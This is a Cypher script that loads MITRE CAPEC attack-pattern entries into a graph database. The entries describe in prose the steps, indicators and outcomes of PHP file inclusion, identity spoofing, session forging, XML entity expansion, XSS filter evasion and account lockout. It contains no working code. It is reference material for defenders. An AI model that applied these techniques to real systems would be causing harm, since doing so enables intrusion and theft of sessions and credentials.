CREATE (:AttackStep{id: 1, title: "Run arbitrary server-side code", description: "<div level=\"0\">\n  <p class=\"text\">As the attacker succeeds in exploiting the vulnerability, he is able to execute server-side code within the application. The malicious code has virtual access to the same resources as the targeted application. Note that the attacker might include shell code in his script and execute commands on the server under the same privileges as the PHP runtime is running with.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious PHP script that is injected through vectors identified during the Experiment Phase and executed by the application server to execute a custom PHP script.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker's script is being executed on the application server"});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
MERGE (:Reference{id: "REF-1", local_id: "R.193.1", title: "WASC Threat Classification 2.0", section: "WASC-05 - Remote File Inclusion", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Remote-File-Inclusion"});
MERGE (:Reference{local_id: "R.193.2", author: "Shaun Clowes", title: "A Study In Scarlet, Exploiting Common Vulnerabilities in PHP Applications", publisher: "Blackhat Briefings Asia 2001", link: "http://www.securereality.com.au/studyinscarlet.txt"});
MERGE (:Reference{id: "REF-8", local_id: "R.193.3", title: "OWASP Top 10", section: "Top 10 2007 - Malicious File Execution", publisher: "The Open Web Application Security Project (OWASP)", link: "http://www.owasp.org/index.php/Top_10_2007-A3"});
MERGE (:CWE{id: 98});
MERGE (:CWE{id: 80});
MERGE (:CWE{id: 714});
CREATE (:ResourcesRequired{id: 92, text: "<div level=\"0\">\n  <p class=\"text\">Ability to send HTTP request to a web application Ability to store PHP scripts on a server</p>\n</div>"});
CREATE (:AttackPattern{id: 194, name: "Fake the Source of Data", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 146, text: "<div level=\"0\">\n  <p class=\"text\">The target application must associate data with its source. This association could be as simple as logging the source of the data (in which case this attack seeks to create a false trail in the log) or the target application could associate some increased level of access with certain identities (in which case an attacker might seek to impersonate those identities in order to increase privileges).</p>\n</div>"});
CREATE (:Submission{id: 173});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 173, summary: "OrderedDict([('Text', 'An adversary provides data under a falsified identity. The purpose of using the falsified identity may be to prevent traceability of the provided data or it might be an attempt by the adversary to assume the rights granted to another identity. One of the simplest forms of this attack would be the creation of an email message with a modified \"From\" field in order to appear that the message was sent from someone other than the actual sender. Results of the attack vary depending on the details of the attack, but common results include privilege escalation, obfuscation of other attacks, and data corruption/manipulation.')])"});
MERGE (:CWE{id: 601});
CREATE (:ResourcesRequired{id: 93, text: "<div level=\"0\">\n  <p class=\"text\">Resources required vary depending on the nature of the attack. Possible tools needed by an attacker could include tools to create custom network packets, specific client software, and tools to capture network traffic. Many variants of this attack require no attacker resources, however.</p>\n</div>"});
CREATE (:AttackPattern{id: 195, name: "Principal Spoof", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 147, text: "<div level=\"0\">\n  <p class=\"text\">The target must associate data or activities with a person's identity and the adversary must be able to modify this identity without detection.</p>\n</div>"});
CREATE (:Submission{id: 174});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 144});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Prerequisites"});
CREATE (:Description{id: 174, summary: "OrderedDict([('Text', \"A Principle Spoof is a form of Identity Spoofing where an adversary pretends to be some other person in an interaction. This is often accomplished by crafting a message (either written, verbal, or visual) that appears to come from a person other than the adversary. Phishing and Pharming attacks often attempt to do this so that their attempts to gather sensitive information appear to come from a legitimate source. A Principle Spoof does not use stolen or spoofed authentication credentials, instead relying on the appearance and content of the message to reflect identity. The possible outcomes of a Principal Spoof mirror those of Identity Spoofing. (e.g., escalation of privilege and false attribution of data or activities) Likewise, most techniques for Identity Spoofing (crafting messages or intercepting and replaying or modifying messages) can be used for a Principal Spoof attack. However, because a Principal Spoof is used to impersonate a person, social engineering can be both an attack technique (using social techniques to generate evidence in support of a false identity) as well as a possible outcome (manipulating people's perceptions by making statements or performing actions under a target's name).\")])"});
CREATE (:ResourcesRequired{id: 94, text: "<div level=\"0\">\n  <p class=\"text\">No special resources are required for most variants of this attack.</p>\n</div>"});
CREATE (:AttackPattern{id: 196, name: "Session Credential Falsification through Forging", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 148, text: "<div level=\"0\">\n  <p class=\"text\">The targeted application must use session credentials to identify legitimate users. Session identifiers that remains unchanged when the privilege levels change. Predictable session identifiers.</p>\n</div>"});
CREATE (:Submission{id: 175});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 175, summary: "OrderedDict([('Text', \"An attacker creates a false but functional session credential in order to gain or usurp access to a service. Session credentials allow users to identify themselves to a service after an initial authentication without needing to resend the authentication information (usually a username and password) with every message. If an attacker is able to forge valid session credentials they may be able to bypass authentication or piggy-back off some other authenticated user's session. This attack differs from Reuse of Session IDs and Session Sidejacking attacks in that in the latter attacks an attacker uses a previous or existing credential without modification while, in a forging attack, the attacker must create their own credential, although it may be based on previously observed credentials.\")])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Analyze and Understand Session IDs", description: "<div level=\"0\">\n  <p class=\"text\">The attacker finds that the targeted application use session credentials to identify legitimate users.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">An attacker makes many anonymous connections and records the session IDs.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">An attacker makes authorized connections and records the session tokens or credentials.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Valid session information</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">No valid session information</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker models the session ID algorithm enough to produce a compatible series or IDs, or just one match. (When IDs are predictable)"});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Create Session IDs.", description: "<div level=\"0\">\n  <p class=\"text\">Attackers craft messages containing their forged credentials in GET, POST request, HTTP headers or cookies.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker manipulates the HTTP request message and adds his forged session IDs in to the requests or cookies.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Find that application uses session credentials.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Find that application does not use session credentials.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Victim application accepts attackers' session credentials."});
CREATE (:Outcome{id: 2, type: "Failure", description: "Victim application does not accept attackers' session credentials."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Abuse the Victim's Session Credentials", description: "<div level=\"0\">\n  <p class=\"text\">The attacker fixates falsified session ID to the victim when victim access the system. Once the victim has achieved a higher level of privilege, possibly by logging into the application, the attacker can now take over the session using the forged session identifier.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker loads the predefined or predicted session ID into his browser and browses to protected data or functionality.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">The attacker loads the predefined or predicted session ID into his software and utilizes functionality with the rights of the victim.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker gains access to data or functionality with the rights of the victim."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
MERGE (:Reference{id: "REF-13", local_id: "R.196.1", author: "Thomas Schreiber", title: "Session Riding: A Widespread Vulnerability in Today's Web Applications", publisher: "SecureNet GmbH", pubdate: "Dec 2004", link: "http://www.securenet.de/papers/Session_Riding.pdf"});
MERGE (:Reference{id: "REF-3", local_id: "R.196.2", title: "Common Weakness Enumeration (CWE)", section: "CWE-384: Session Fixation", publisher: "The MITRE Corporation", link: "http://cwe.mitre.org/data/definitions/384.html"});
MERGE (:Reference{id: "REF-4", local_id: "R.196.3", title: "OWASP Testing Guide", section: "Testing for Session Management", publisher: "The Open Web Application Security Project (OWASP)", link: "http://www.owasp.org/index.php/Testing_for_Session_Management"});
MERGE (:CWE{id: 384});
MERGE (:CWE{id: 361});
MERGE (:CWE{id: 664});
CREATE (:ResourcesRequired{id: 95, text: "<div level=\"0\">\n  <p class=\"text\">Attackers may require tools to craft messages containing their forged credentials, and ability to send HTTP request to a web application.</p>\n</div>"});
CREATE (:AttackPattern{id: 197, name: "XML Entity Expansion", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 149, text: "<div level=\"0\">\n  <p class=\"text\">This type of attack requires that the target must receive XML input but either fail to provide an upper limit for entity expansion or provide a limit that is so large that it does not preclude significant resource consumption.</p>\n</div>"});
CREATE (:Submission{id: 176});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 176, summary: "OrderedDict([('Text', \"An attacker submits an XML document to a target application where the XML document uses nested entity expansion to produce an excessively large output XML. XML allows the definition of macro-like structures that can be used to simplify the creation of complex structures. However, this capability can be abused to create excessive demands on a processor's CPU and memory. A small number of nested expansions can result in an exponential growth in demands on memory.\")])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Survey the target", description: "<div level=\"0\">\n  <p class=\"text\">Using a browser or an automated tool, an attacker records all instances of web services to process XML requests.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use an automated tool to record all instances of URLs to process XML requests.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a browser to manually explore the website and analyze how the application processes XML requests.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The URL processes XML content.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">The application does not seem to accept XML content.</p>\n</div>"});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:AttackPhase{id: 2, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Launch an XML Entity Expansion attack", description: "<div level=\"0\">\n  <p class=\"text\">The attacker crafts malicious XML message to force recursive entity expansion (or other repeated processing) that completely uses up available server resource.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Send the malicious crafted XML message containing recursive entity uses to the target URL.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker causes the target application denial of service."});
CREATE (:SecurityControl{id: 1, type: "Preventative "});
MERGE (:Reference{local_id: "R.197.1", author: "Amit Klein", title: "Multiple vendors XML parser (and SOAP/WebServices server) Denial of Service attack using DTD", link: "http://www.securityfocus.com/archive/1/303509"});
MERGE (:Reference{id: "REF-14", local_id: "R.197.2", author: "Andre Yee", title: "Threat Protection in a Service Oriented World", publisher: "NFR Security", link: "http://www.unatekconference.com/images/pdfs/presentations/Yee.pdf"});
MERGE (:Reference{id: "REF-15", local_id: "R.197.3", author: "Pete Lindstrom", title: "Attacking & Defending Web Services", publisher: "SPiRE Security", pubdate: "2002", link: "http://www.webtorials.com/main/comnet/cn2003/web-service/24.pdf"});
MERGE (:Reference{id: "REF-16", local_id: "R.197.4", author: "Elliotte Rusty Harold", title: "Tip: Configure SAX parsers for secure processing", publisher: "IBM", pubdate: "May 27, 2005", link: "http://www.ibm.com/developerworks/xml/library/x-tipcfsx.html"});
MERGE (:CWE{id: 400});
MERGE (:CWE{id: 770});
CREATE (:ResourcesRequired{id: 96, text: "<div level=\"0\">\n  <p class=\"text\">No special resource required.</p>\n</div>"});
CREATE (:AttackPattern{id: 198, name: "XSS Targeting Error Pages", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 150, text: "<div level=\"0\">\n  <p class=\"text\">A third party web server which fails to adequately sanitize messages sent in error pages.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 151, text: "<div level=\"0\">\n  <p class=\"text\">The victim must be made to execute a query crafted by the attacker which results in the infected error report.</p>\n</div>"});
CREATE (:Submission{id: 177});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 145});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Description Summary, Related_Attack_Patterns, Related_Weaknesses"});
CREATE (:PreviousEntryName{id: 36, name: "Cross-Site Scripting in Error Pages"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 177, summary: "OrderedDict([('Text', \"An adversary distributes a link (or possibly some other query structure) with a request to a third party web server that is malformed and also contains a block of exploit code in order to have the exploit become live code in the resulting error page. When the third party web server receives the crafted request and notes the error it then creates an error message that echoes the malformed message, including the exploit. Doing this converts the exploit portion of the message into to valid language elements that are executed by the viewing browser. When a victim executes the query provided by the attacker the infected error message error message is returned including the exploit code which then runs in the victim's browser. XSS can result in execution of code as well as data leakage (e.g. session cookies can be sent to the attacker). This type of attack is especially dangerous since the exploit appears to come from the third party web server, who the victim may trust and hence be more vulnerable to deception.\")])"});
MERGE (:CWE{id: 81});
CREATE (:ResourcesRequired{id: 97, text: "<div level=\"0\">\n  <p class=\"text\">None</p>\n</div>"});
CREATE (:AttackPattern{id: 199, name: "XSS Using Alternate Syntax", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 152, text: "<div level=\"0\">\n  <p class=\"text\">Target client software must allow scripting such as JavaScript.</p>\n</div>"});
CREATE (:Submission{id: 178});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 146});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Description Summary, Related_Attack_Patterns, Related_Weaknesses"});
CREATE (:PreviousEntryName{id: 37, name: "Cross-Site Scripting Using Alternate Syntax"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 178, summary: "OrderedDict([('Text', 'An adversary uses alternate forms of keywords or commands that result in the same action as the primary form but which may not be caught by filters. For example, many keywords are processed in a case insensitive manner. If the site\\'s web filtering algorithm does not convert all tags into a consistent case before the comparison with forbidden keywords it is possible to bypass filters (e.g., incomplete black lists) by using an alternate case structure. For example, the \"script\" tag using the alternate forms of \"Script\" or \"ScRiPt\" may bypass filters where \"script\" is the only form tested. Other variants using different syntax representations are also possible as well as using pollution meta-characters or entities that are eventually ignored by the rendering engine. The attack can result in the execution of otherwise prohibited functionality.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Survey the application", description: "<div level=\"0\">\n  <p class=\"text\">Using a browser or an automated tool, an attacker follows all public links on a web site. He records all the links he finds.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">URL parameters are used by the application or the browser (DOM)</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">Using URL rewriting, parameters may be part of the URL path.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">No parameters appear on the URL. Even though none appear, the web application may still use them if they are provided.</p>\n</div>"});
CREATE (:Indicator{id: 4, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Applications that have only static pages or that simply present information without accepting input are unlikely to be susceptible.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A list of URLs, with their corresponding parameters is created by the attacker."});
CREATE (:Outcome{id: 2, type: "Success", description: "A list of application user interface entry fields is created by the attacker."});
CREATE (:Outcome{id: 3, type: "Success", description: "A list of resources accessed by the application is created by the attacker."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Attempt injection payload variations on input parameters", description: "<div level=\"0\">\n  <p class=\"text\">Possibly using an automated tool, an attacker requests variations on the inputs he surveyed before. He sends parameters that include variations of payloads. The payloads are designed to bypass incomplete filtering (e.g., incomplete HTML encoding etc.) and tries many variations of characters injection that would enable the XSS payload. He records all the responses from the server that include unmodified versions of his script.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use a list of XSS probe strings to inject in parameters of known URLs. If possible, the probe strings contain a unique identifier. Attempt numerous variations based on form, format, syntax & encoding.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a proxy tool to record results of manual input of XSS probes in known URLs.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The output of pages includes some form of a URL parameter. E.g., ?error=\"File not Found\" becomes \"File not Found\" in the title of the web page</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">User-controllable input is output back to the browser</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">Nothing is returned to the web page. The payload may be a stored to be served later. The unique identifier from the probe helps to trace the flow of the possible XSS.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker's script string is being reflected verbatim at some point in the web site (if not on the same page). Note that sometimes, the payload might be well encoded in the page, but wouldn't be encoded at all in some other section of the same web page (title, etc.)"});
CREATE (:Outcome{id: 2, type: "Failure", description: "All context-sensitive characters are consistently re-encoded before being sent to the web browser. For example, in a HTML tag element, the payload may not be able to evade the quotes in order to inject another attribute."});
CREATE (:Outcome{id: 3, type: "Inconclusive", description: "Some sensitive characters are consistently encoded, but others are not"});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Steal session IDs, credentials, page content, etc.", description: "<div level=\"0\">\n  <p class=\"text\">As the attacker succeeds in exploiting the vulnerability, he can choose to steal user's credentials in order to reuse or to analyze them later on.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker gets the user's cookies or other session identifiers."});
CREATE (:Outcome{id: 2, type: "Success", description: "The attacker gets the content of the page the user is viewing."});
CREATE (:Outcome{id: 3, type: "Success", description: "The attacker causes the user's browser to visit a page with malicious content."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:SecurityControl{id: 5, type: "Preventative"});
CREATE (:AttackStep{id: 2, title: "Forceful browsing", description: "<div level=\"0\">\n  <p class=\"text\">When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web site</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker indirectly controls the user's browser and makes it performing actions exploiting CSRF."});
CREATE (:Outcome{id: 2, type: "Success", description: "The attacker manipulates the browser through the steps that he designed in his attack. The user, identified on a website, is now performing actions he is not aware of."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:SecurityControl{id: 5, type: "Preventative"});
CREATE (:AttackStep{id: 3, title: "Content spoofing", description: "<div level=\"0\">\n  <p class=\"text\">By manipulating the content, the attacker targets the information that the user would like to get from the website.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The user sees a page containing wrong information"});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:SecurityControl{id: 5, type: "Preventative"});
MERGE (:Reference{id: "REF-9", local_id: "R.199.1", title: "OWASP Cheatsheets", section: "XSS Filter Evasion Cheat Sheet", publisher: "The Open Web Application Security Project (OWASP)", link: "https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet"});
MERGE (:Reference{id: "REF-4", local_id: "R.199.2", title: "OWASP Testing Guide", section: "Testing for Cross site scripting", publisher: "The Open Web Application Security Project (OWASP)", link: "http://www.owasp.org/index.php/Testing_for_Cross_site_scripting"});
MERGE (:Reference{local_id: "R.199.3", title: "Non-alphanumeric XSS cheat sheet", link: "http://sla.ckers.org/forum/read.php?24,28687"});
MERGE (:Reference{id: "REF-1", local_id: "R.199.4", title: "WASC Threat Classification 2.0", section: "WASC-08 - Cross Site Scripting", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Cross-Site+Scripting"});
MERGE (:CWE{id: 87});
CREATE (:ResourcesRequired{id: 98, text: "<div level=\"0\">\n  <p class=\"text\">Ability to send HTTP request to a web application.</p>\n</div>"});
CREATE (:AttackPattern{id: 2, name: "Inducing Account Lockout", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 153, text: "<div level=\"0\">\n  <p class=\"text\">The system has a lockout mechanism.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 154, text: "<div level=\"0\">\n  <p class=\"text\">An attacker must be able to reproduce behavior that would result in an account being locked.</p>\n</div>"});
CREATE (:Submission{id: 179});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 179, summary: "OrderedDict([('Text', 'An attacker leverages the security functionality of the system aimed at thwarting potential attacks to launch a denial of service attack against a legitimate system user. Many systems, for instance, implement a password throttling mechanism that locks an account after a certain number of incorrect log in attempts. An attacker can leverage this throttling mechanism to lock a legitimate user out of their own account. The weakness that is being leveraged by an attacker is the very security feature that has been put in place to counteract attacks.')])"});
CREATE (:AttackPhase{id: 1, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Investigate account lockout behavior of system", description: "<div level=\"0\">\n  <p class=\"text\">Investigate the security features present in the system that may trigger an account lockout</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Analyze system documentation to find list of events that could potentially cause account lockout</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Obtain user account in system and attempt to lock it out by sending malformed or incorrect data repeatedly</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Determine another user's login ID, and attempt to brute force the password (or other credentials) for it a predetermined number of times, or until the system provides an indication that the account is locked out.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">System provides error message stating that account being attacked is locked out.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">After a certain number of login attempts with a given user ID, the amount of time it takes for system to respond to further login attempts changes noticeably.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">System has no automatic signup mechanism, and system provides no indication as to whether the attacker is entering incorrect credentials or the account is locked out during the login process.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Attacker determines at least one way to lock out accounts."});
CREATE (:Outcome{id: 2, type: "Failure", description: "System provides no indication that account lockouts are possible"});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:AttackStep{id: 2, title: "Obtain list of user accounts to lock out", description: "<div level=\"0\">\n  <p class=\"text\">Generate a list of valid user accounts to lock out</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Obtain list of authorized users using another attack pattern, such as SQL Injection.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Attempt to create accounts if possible; system should indicate if a user ID is already taken.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Attempt to brute force user IDs if system reveals whether a given user ID is valid or not upon failed login attempts.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">System indicates which user IDs are valid and which are not to unauthenticated users.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Attacker gathers list of user IDs"});
CREATE (:Outcome{id: 2, type: "Inconclusive", description: "Attacker is unable to gather list of valid user IDs; attacker may still be able to lock out accounts by blindly guessing user IDs and performing a lockout procedure with each one."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Lock Out Accounts", description: "<div level=\"0\">\n  <p class=\"text\">Perform lockout procedure for all accounts that the attacker wants to lock out.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">For each user ID to be locked out, perform the lockout procedure discovered in the first step.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Success outcome in first step</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Failure outcome in first step</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Amount of work required by an attacker to lock out a large number of accounts is at least an order of magnitude smaller than the amount of work required to unlock the accounts thereafter."});
CREATE (:Outcome{id: 2, type: "Failure", description: "The large amount of work required by an attacker to lock out a large number of accounts makes this an unattractive attack."});
MERGE (:CWE{id: 400});
CREATE (:ResourcesRequired{id: 99, text: "<div level=\"0\">\n  <p class=\"text\">Computer with access to the login portion of the target system</p>\n</div>"});
CREATE (:AttackPattern{id: 20, name: "Encryption Brute Forcing", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
